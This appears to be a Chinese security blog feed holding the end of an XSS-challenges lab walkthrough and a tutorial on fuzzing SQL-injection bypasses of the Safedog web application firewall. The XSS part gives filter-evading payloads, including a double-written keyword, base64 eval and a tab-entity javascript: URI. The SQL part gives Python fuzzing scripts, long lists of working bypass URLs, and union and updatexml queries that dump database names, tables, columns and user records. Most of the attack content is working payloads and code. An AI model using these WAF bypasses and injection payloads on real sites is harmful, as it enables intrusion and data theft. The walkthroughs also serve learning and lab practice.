<h2 id="Stage-7"><a href="#Stage-7" class="headerlink" title="Stage #7"></a>Stage #7</h2><p>在使用前面的事件或闭合标签都不起作用是时，我们尝试在文本框中输入空格，发现空格后面的内容会在后面作为标签出现<br>当我们输入111时<br><img src="/2020/03/04/XSS-challenges/16.png" alt><br>当我们输入111    222时<br><img src="/2020/03/04/XSS-challenges/17.png" alt><br>Payload：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">111 </span>onmouseover=alert(document.domain);</span><br></pre></td></tr></table></figure>

<p>当我们输入111 onmouseover=”alert(document.domain);”时，发现多了一对双引号使我们的JavaScript代码变为了字符串，所以我们的payload中应该去掉双引号<br>成功弹框<br><img src="/2020/03/04/XSS-challenges/18.png" alt></p>
<h2 id="Stage-8"><a href="#Stage-8" class="headerlink" title="Stage #8"></a>Stage #8</h2><p>我们在输入框中输入一段字符串，发现该字符串在&lt;a href&gt;中显示，这时可以使用JavaScript伪协议</p>
<p>JavaScript伪协议：<br>将JavaScript代码添加到客户端的方法是把它放置在伪协议说明符JavaScript;后面的url中的JavaScript代码含有多个语句，必须使用这些语句分隔开。</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">javascript:var </span>now=new Date()<span class="comment">;"&lt;h1&gt;The time is&lt;/h1&gt;"+now;</span></span><br><span class="line">		<span class="keyword">javascript </span>URL还可以含有只执行动作，但不返回值的<span class="keyword">JavaScript语句。</span></span><br><span class="line"><span class="keyword">javascript:alert("hello </span>world<span class="string">")</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/19.png" alt="img"></p>
<p>Payload触发xss漏洞</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Payload</span><span class="selector-pseudo">:javascript</span><span class="selector-pseudo">:alert(document.domain)</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/20.png" alt="img"></p>
<p>当我们点击下面的url时，就会触发弹窗</p>
<p><img src="/2020/03/04/XSS-challenges/21.png" alt="img"></p>
<h2 id="Stage-9"><a href="#Stage-9" class="headerlink" title="Stage #9"></a>Stage #9</h2><p>这一个是utf-7的xss漏洞，直接输入</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">onclick</span>=<span class="string">"alert(document.domain)"</span></span><br></pre></td></tr></table></figure>

<p>便能成功触发事件并弹窗，但是这个仅限于在IE环境中</p>
<h2 id="Stage-10"><a href="#Stage-10" class="headerlink" title="Stage #10"></a>Stage #10</h2><p>一般思路可以闭合value：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">"&gt;undefined<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是并没有弹窗<br>我们找到我们输入代码的位置，发现其中的domain为空，被过滤了<br><img src="/2020/03/04/XSS-challenges/22.png" alt="img"><br>所以我们要考虑绕过<br>1.寻找过滤内容<br>2.思考绕过策略<br>    双写绕过<br>        dodomainmain，这样中间的domain就会被过滤从而从新连接成domain</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.dodomainmain);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/23.png" alt="img"><br>成功弹窗<br>  编码绕过<br>可以将domain进行可以被JavaScript可以识别的编码加密<br>Payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">"&gt;undefined<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(atob(<span class="string">'YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>eval是JavaScript中执行字符串的函数<br>atob函数是将加密的base64转换为原文进行执行<br>我们输入payload，成功弹窗</p>
<p><img src="/2020/03/04/XSS-challenges/24.png" alt="img"></p>
<h2 id="Stage-11"><a href="#Stage-11" class="headerlink" title="Stage #11"></a>Stage #11</h2><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">当我们输入xxx<span class="string">"&gt;onmouseover="</span>alert(document.domain)<span class="string">"时，我们发现onmouseover被替换</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/25.png" alt="img"></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">当输入xxx"&gt;undefined<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>时，发现script也被替换</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/26.png" alt="img"></p>
<p>这时候我们考虑伪协议绕过<br>Payload：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="number">111</span><span class="string">"&gt;&lt;a href="</span>javascrip<span class="variable">t:alert</span>(document.domain)<span class="comment">"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是script依然被替换了</p>
<p><img src="/2020/03/04/XSS-challenges/27.png" alt="img"><br>空格绕过<br>Payload：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javas&amp;#09;cript:alert(document.domain);"</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br></pre></td></tr></table></figure>

<p>我们可以在JavaScript中间加上tab的 Unicode编码&amp;#09;进行绕过，这时就不会识别为script，但是依然可以当做script执行</p>
<p><img src="/2020/03/04/XSS-challenges/28.png" alt="img"></p>
<p><img src="/2020/03/04/XSS-challenges/29.png" alt="img"></p>
<h2 id="Stage-12"><a href="#Stage-12" class="headerlink" title="Stage #12"></a>Stage #12</h2><p>1.我们考虑用html事件来触发xss漏洞</p>
<p>Payload：</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line"><span class="number">111</span><span class="string">"&gt;onclick="</span>alert(<span class="name">document</span>.domain)<span class="string">"</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/30.png" alt="img"></p>
<p>我们发现并没有触发事件并且双引号和空格均被过滤掉<br>2.然后我们考虑闭合input，利用外部标签触发xss<br>Payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">111&quot;&gt;undefinedundefinedundefined&lt;script&gt;alert(document.domain);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/04/XSS-challenges/31.png" alt="img"></p>
<p>结果双引号和尖括号依然被过滤，是的我们无法触发xss漏洞<br>3.IE浏览器特性<br>    在IE中，两个反引号``可以闭合一个左边的双引号<br> Payload:</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line">``<span class="variable">onmousemove</span>=<span class="function"><span class="title">alert</span>(<span class="variable">document.domain</span>)</span></span><br></pre></td></tr></table></figure>

<p>成功在IE浏览器中触发xss事件</p>
<p><img src="/2020/03/04/XSS-challenges/32.png" alt="img"></p>
<hr>
<p>xss-challenges一共20关，暂时就先做到12关，后面由于浏览器版本问题难以复现，所以便没有继续做下去。<br>参考链接：<a href="https://www.cnblogs.com/r00tuser/p/7413526.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tuser/p/7413526.html</a>    ——2020.3.5</p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入Fuzz测试绕过安全狗</title>
    <url>/2020/06/05/sql-Fuzz/</url>
    <content><![CDATA[<p><strong>Fuzz测试绕过SQL注入waf</strong><a id="more"></a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>phpstudy2018—-使用系统服务运行<br>网站安全狗最新版V4.0(Apache版)—-关闭cc防护<br>sqli-labs-Less-1</p>
<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="绕过and-1-1"><a href="#绕过and-1-1" class="headerlink" title="绕过and 1=1"></a>绕过and 1=1</h2><p>输入<code>&#39;and 1=1--+&#39;</code>、<code>&#39;and 1=2--+&#39;</code>被拦截<br><img src="/2020/06/05/sql-Fuzz/1591317908825.png" alt="1591317908825"></p>
<p>可以使用<code>%26%26</code>代替and，后面的条件使用<code>true</code>和<code>false</code>进行绕过<br><img src="/2020/06/05/sql-Fuzz/1591319389284.png" alt="1591319389284"></p>
<p><img src="/2020/06/05/sql-Fuzz/1591319400893.png" alt="1591319400893"></p>
<p>也可以直接绕过and和or：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*!11440OR*/</span></span><br><span class="line"><span class="comment">/*!11440AND*/</span></span><br><span class="line">#里面的数字范围在<span class="number">11440</span><span class="number">-11449</span>之间才行</span><br></pre></td></tr></table></figure>

<h2 id="绕过order-by"><a href="#绕过order-by" class="headerlink" title="绕过order by"></a>绕过order by</h2><p><code>order by</code>查询字段<br>发现<code>order by</code>被拦截<br><img src="/2020/06/05/sql-Fuzz/1591326528451.png" alt="1591326528451"></p>
<p>这里可以通过内联注释来绕过<br><img src="/2020/06/05/sql-Fuzz/1591326726888.png" alt="1591326726888"></p>
<p>这里使用脚本进行fuzz，先构造注释的语句<code>/*!order/*!&quot; + a + b + c + d + &quot;*/by*/ 1</code><br>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">fuzz_zs = [<span class="string">'/*'</span>, <span class="string">'*/'</span>, <span class="string">'/*!'</span>, <span class="string">'*'</span>, <span class="string">'='</span>, <span class="string">'`'</span>, <span class="string">'!'</span>, <span class="string">'@'</span>, <span class="string">'%'</span>, <span class="string">'.'</span>, <span class="string">'-'</span>, <span class="string">'+'</span>, <span class="string">'|'</span>, <span class="string">'%00'</span>]</span><br><span class="line">fuzz_sz = [<span class="string">''</span>, <span class="string">' '</span>]</span><br><span class="line">fuzz_ch = [<span class="string">"%0a"</span>, <span class="string">"%0b"</span>, <span class="string">"%0c"</span>, <span class="string">"%0d"</span>, <span class="string">"%0e"</span>, <span class="string">"%0f"</span>, <span class="string">"%0g"</span>, <span class="string">"%0h"</span>, <span class="string">"%0i"</span>, <span class="string">"%0j"</span>]</span><br><span class="line">fuzz = fuzz_zs + fuzz_sz + fuzz_ch</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"</span></span><br><span class="line">&#125;</span><br><span class="line">url_start = <span class="string">"http://192.168.211.130/sqli-labs/Less-1/?id=1"</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> fuzz:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fuzz:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> fuzz:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> fuzz:</span><br><span class="line">                exp = <span class="string">"' /*!order/*!"</span> + a + b + c + d + <span class="string">"*/by*/ 99--+"</span></span><br><span class="line">                url = url_start + exp</span><br><span class="line">                res = requests.get(url=url, headers=headers)</span><br><span class="line">                print(<span class="string">"Now URL:"</span> + url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Unknown column"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    print(<span class="string">"Bypass:"</span> + url)</span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">"fuzz.txt"</span>, <span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> r:</span><br><span class="line">                        r.write(url + <span class="string">"\n"</span>)</span><br><span class="line"><span class="comment">#更全的fuzz字符</span></span><br><span class="line"><span class="comment"># fuzz_zs = ['/*','*/','/*!','?','*','=','`','~','!','@','%','.','-','+','|','%00'.'%20' ,'%09', '%0a', '%0b', '%0c', '%0d' ,</span></span><br><span class="line"><span class="comment"># '%a0' ,'/**/']</span></span><br><span class="line"><span class="comment"># fuzz_sz = ['0','1','2','3','4','5','6','7','8','9']</span></span><br><span class="line"><span class="comment"># fuzz_ch=["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j","%0k","%0l","%0m","%0n","%0o","%0p","%0q","%0r","%0s","%0t","%0u","%0v","%0w","%0x","%0y","%0z"]</span></span><br></pre></td></tr></table></figure>

<p>最终fuzz出很多可用的字符串<br><img src="/2020/06/05/sql-Fuzz/1591327358395.png" alt="1591327358395"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**//**/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/****/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**=*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**`*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**!*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**@*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**.*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**-*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**+*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**|*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%00*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/***/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/** */by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0a*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0b*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0c*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0d*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0e*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0f*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0g*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0h*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0i*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/**%0j*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*=/**/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`**/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`=*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*``*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`!*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`@*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`.*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`-*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`+*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`|*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%00*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*` */by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0a*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0b*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0c*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0d*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0e*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0f*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0g*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0h*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0i*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*`%0j*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!**/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!=*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!`*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!!*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!@*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!.*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!-*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!|*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!%0e*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!%0f*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!%0g*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!%0h*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!%0i*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*!%0j*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*@/**/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*@/*!*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*@**/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*@=*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*@`*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*@!*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*@@*/by*/ 99--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!order/*!/*/*@%*/by*/ 99--+</span><br></pre></td></tr></table></figure>

<p>上面的字符全都可以绕过安全狗</p>
<p><img src="/2020/06/05/sql-Fuzz/1591328032241.png" alt="1591328032241"></p>
<h2 id="绕过union-select"><a href="#绕过union-select" class="headerlink" title="绕过union select"></a>绕过union select</h2><p>同样使用上面的脚本进行fuzz，将exp和if语句判断的内容修改即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">fuzz_zs = [<span class="string">'/*'</span>, <span class="string">'*/'</span>, <span class="string">'/*!'</span>, <span class="string">'*'</span>, <span class="string">'='</span>, <span class="string">'`'</span>, <span class="string">'!'</span>, <span class="string">'@'</span>, <span class="string">'%'</span>, <span class="string">'.'</span>, <span class="string">'-'</span>, <span class="string">'+'</span>, <span class="string">'|'</span>, <span class="string">'%00'</span>]</span><br><span class="line">fuzz_sz = [<span class="string">''</span>, <span class="string">' '</span>]</span><br><span class="line">fuzz_ch = [<span class="string">"%0a"</span>, <span class="string">"%0b"</span>, <span class="string">"%0c"</span>, <span class="string">"%0d"</span>, <span class="string">"%0e"</span>, <span class="string">"%0f"</span>, <span class="string">"%0g"</span>, <span class="string">"%0h"</span>, <span class="string">"%0i"</span>, <span class="string">"%0j"</span>]</span><br><span class="line">fuzz = fuzz_zs + fuzz_sz + fuzz_ch</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"</span></span><br><span class="line">&#125;</span><br><span class="line">url_start = <span class="string">"http://192.168.211.130/sqli-labs/Less-1/?id=1"</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> fuzz:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fuzz:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> fuzz:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> fuzz:</span><br><span class="line">                exp = <span class="string">"' /*!union/*!"</span> + a + b + c + d + <span class="string">"*/select*/ 1,2,3--+"</span></span><br><span class="line">                url = url_start + exp</span><br><span class="line">                res = requests.get(url=url, headers=headers)</span><br><span class="line">                print(<span class="string">"Now URL:"</span> + url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"Your Login name"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    print(<span class="string">"Bypass:"</span> + url)</span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">"fuzz.txt"</span>, <span class="string">'a'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> r:</span><br><span class="line">                        r.write(url + <span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/sql-Fuzz/1591328630218.png" alt="1591328630218"></p>
<p>可用字符串</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/**%0g*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/**%0h*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/**%0i*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/**%0j*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*=%0g*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*=%0h*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*=%0i*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*=%0j*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*`%0g*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*`%0h*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*`%0i*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*`%0j*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*!%0g*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*!%0h*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*!%0i*/select*/ 1,2,3--+</span><br><span class="line">http://192.168.211.130/sqli-labs/Less-1/?id=1' /*!union/*!/*/*!%0j*/select*/ 1,2,3--+</span><br></pre></td></tr></table></figure>

<p>这里选择<code>/*!union/*!/*/*!%0i*/select*/</code>来绕过<br><img src="/2020/06/05/sql-Fuzz/1591328787629.png" alt="1591328787629"></p>
<p>能绕过<code>union select</code>的也能绕过<code>order by</code>，可能是<code>union select</code>防护的比较严<br>另一种payload:<br><code>order/*!60000ghtwf01*/by</code>可以实现绕过，数字要大于<code>50000</code>，<code>union select</code>也可用其绕过</p>
<p>这时候发现database()也被拦截了<br>使用<code>(database/**/())</code>绕过，也可以使用<code>/*!database/*!/*/*!%0i*/()*/</code>来绕过<br><img src="/2020/06/05/sql-Fuzz/1591329710780.png" alt="1591329710780"></p>
<p><img src="/2020/06/05/sql-Fuzz/1591329336041.png" alt="1591329336041"></p>
<h2 id="绕过schema-name"><a href="#绕过schema-name" class="headerlink" title="绕过schema_name"></a>绕过schema_name</h2><p>之后查询所有数据库名，使用<code>schema_name</code>会被拦截，这里使用内联注释绕过</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=0%27%20/*!union/*!/*/*!%0i*/select*/%201,(select%20group_concat(/*!schema_name*/)%20from%20information_schema.schemata),3--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/sql-Fuzz/1591339319418.png" alt="1591339319418"></p>
<p><strong>查询表名</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=0%27%20/*!union/*!/*/*!%0i*/select*/%201,(select%20group_concat(/*!table_name*/)%20from%20information_schema.tables%20where%20table_schema=%27security%27%20),3--+</span><br></pre></td></tr></table></figure>

<p><strong>table_name</strong>同样会被拦截，依然可以使用内联注释绕过<br><strong>查询列名</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=0%27%20/*!union/*!/*/*!%0i*/select*/%201,(select%20group_concat(/*!column_name*/)%20from%20information_schema.columns%20where%20table_name=%27users%27%20),3--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/sql-Fuzz/1591339467520.png" alt="1591339467520"></p>
<p><strong>查数据</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=0%27%20/*!union/*!/*/*!%0i*/select*/%201,(select%20group_concat(/*!id,username*/)%20from%20users%20),3--+</span><br></pre></td></tr></table></figure>

<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="绕过updatexml"><a href="#绕过updatexml" class="headerlink" title="绕过updatexml()"></a>绕过updatexml()</h2><p><strong>库名</strong></p>
<p>当使用<code>updatexml(1,concat(0x7e,database(),0x7e),1)--+</code>爆数据库时被拦截</p>
<p><img src="/2020/06/05/sql-Fuzz/1591339933744.png" alt="1591339933744"></p>
<p>应该是updatexml()函数和database()函数被安全狗识别，使用上面fuzz的payload进行绕过<br><code>/*!updatexml/*!/*/*!%0i*/(1,concat(0x7e,(database/**/()),0x7e),1)*/--+</code><br><img src="/2020/06/05/sql-Fuzz/1591340954991.png" alt="1591340954991"></p>
<p><strong>表名</strong></p>
<p>在进行爆表名的时候发现<code>table_schema=&#39;&#39;</code>后面不能接引号，所以采用十六进制绕过</p>
